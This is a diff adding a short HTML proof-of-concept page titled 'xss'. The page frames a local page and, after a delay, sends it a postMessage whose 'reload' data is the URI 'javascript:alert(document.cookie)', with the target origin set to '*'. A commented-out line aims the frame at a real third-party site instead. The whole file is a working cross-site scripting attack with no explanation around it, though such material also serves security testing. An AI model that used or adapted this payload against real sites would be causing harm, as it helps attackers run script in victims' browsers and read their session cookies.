@@ -1,0 +1,20 @@
+<html>
+
+<h2>xss</h2>
+
+<body>
+
+<script>  
+</script>
+<!-- <iframe id="iframe"  height="100%" width="100%"  src="https://opm.qq.com/"></iframe> -->
+<iframe id="iframe"  height="100%" width="100%"  src="./on-message.html"></iframe>
+<script>
+
+var message = {"type":"reload","data":"javascript:alert(document.cookie)"};
+
+setTimeout(function(){
+	document.getElementsByTagName("iframe")[0].contentWindow.postMessage(message, '*'); 
+}, 500);
+</script>
+</body>
+</html>
